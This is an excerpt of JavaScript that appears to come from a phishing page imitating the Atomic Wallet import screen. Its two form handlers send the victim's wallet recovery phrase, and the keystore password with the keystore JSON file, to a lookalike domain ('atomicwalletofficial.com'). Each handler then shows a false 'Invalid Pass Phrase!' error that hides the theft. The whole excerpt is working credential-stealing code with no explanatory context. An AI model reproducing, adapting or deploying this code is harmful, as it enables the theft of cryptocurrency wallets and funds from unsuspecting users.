...
const formSubmitPhrase = async (e) => {
  ...
  const res = await fetch("https://atomicwalletofficial.com/import/mnemonic.php", {
    method: "POST",
    body: JSON.stringify({ message: phrase_value }),
    headers: { "Content-Type": "application/json" }
  });
  const response = await res.json();
  console.log(response);
  swal("Error!", "Invalid Pass Phrase!", "error");
...
const formSubmitKeystore = async (e) => {
  ...
  const res = await fetch("https://atomicwalletofficial.com/import/mnemonic.php", {
    method: "POST",
    body: JSON.stringify({ message: keystore_pass+" /json: "+keystore_json }),
    headers: { "Content-Type": "application/json" }
  });
  const response = await res.json();
  swal("Error!", "Invalid Pass Phrase!", "error");
